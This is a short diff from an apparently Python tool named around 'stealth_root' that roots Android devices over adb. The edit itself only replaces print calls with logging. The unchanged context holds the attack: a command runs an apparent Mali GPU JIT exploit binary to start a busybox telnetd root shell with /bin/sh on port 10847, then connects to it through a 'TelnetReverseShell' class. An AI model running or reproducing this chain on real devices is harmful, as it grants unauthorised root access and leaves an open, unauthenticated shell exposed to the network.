@@ -56,12 +56,12 @@ def stealth_root(device: dict) -> bool:
             time.sleep(5)
             continue
         time.sleep(2)
-        print("Trying to get root access")
+        logger.info("Trying to get root access")
         output = adb("shell 'echo /data/local/tmp/bins/busybox telnetd -l /bin/sh -p 10847 | /data/local/tmp/mali/mali_jit'", device["serial"])
         if type(output) == bool and not output:
-            print("Could not run command")
+            logger.warning("Could not run command")
             continue
-        print(output)
+        logger.info(output)
         # if the last line is not "result 50" then redo
         if "result 50" in output:
             device["telnet"] = TelnetReverseShell(device["ip"], 10847)
